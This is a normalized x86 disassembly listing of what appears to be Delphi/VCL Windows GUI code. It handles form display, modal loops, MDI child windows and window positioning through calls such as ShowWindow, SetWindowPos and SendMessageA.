pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4525ac
lea edx [ ebp - 0x14 ]
call sub_455d74
push ebp
mov eax [ ebp - 0x4 ]
call sub_4525ac
lea edx [ ebp - 0x24 ]
call sub_455d74
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_454570
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4525ac
lea edx [ ebp - 0x24 ]
call sub_455d74
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_454570
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_454570
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_454570
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_454654
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403454
pop esi
pop ebx
retn
sub_454678
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403454
pop esi
pop ebx
retn
sub_45469c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_43e6a4
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_43f75c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_43f75c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_454738
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454ca2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_458e4c
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_454c85
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454c8c
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
xor eax eax
push ebp
push j_sub_4036e0#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_4547f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4538e4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43c780
jmp r-xdata
mov eax [ rw-data ]
call sub_455fd0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_438444
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43f228
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_455fc4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_438488
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f228
call sub_44f540
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_456000
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_438444
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_455fd0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_438ca0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_455ff4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_438488
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_455fc4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_452b94
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_452b94
jmp r-xdata
sub_4547f5
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_458560
call sub_403a48
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_455fd0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_438444
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_455fc4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_438488
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_456000
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_438444
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_455fd0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454c8c
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_438ca0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_455ff4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_438488
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_455fc4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_452b94
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_452b94
jmp r-xdata
sub_454b91
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_458560
call sub_403a48
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4538e4
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43c780
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43f228
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454c8c
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f228
call sub_44f540
mov ebx eax
sub_454cd8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_454d30
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c010
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454d8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403258
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_454d9c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403454
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_454dc8
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45854c
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403454
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_454f68
jmp r-xdata
mov eax ebx
call sub_455004
mov dl 0x1
mov eax ebx
call sub_452b54
jmp r-xdata
sub_454e6c
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_4524e0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_45252c
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_454ed0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4036e0#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403454
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_455004
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_454f88
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_454ff6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454ffd
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4537e0
sub_455020
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4552e8
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4372a0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_4574c0
xor edx edx
push ebp
push sub_4552cb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_413828
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_4564f0
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_44f3f0
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4552a9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_454f70
xor edx edx
push ebp
push sub_455208
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_454ed0
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_4582cc
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_43f228
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45520f
mov eax [ ebp - 0x4 ]
call sub_454f68
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45520f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4552b3
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4564f0
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_4564f0
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_4137a4
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_4138f0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44f4a4
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4552f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43bf58
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4552f8
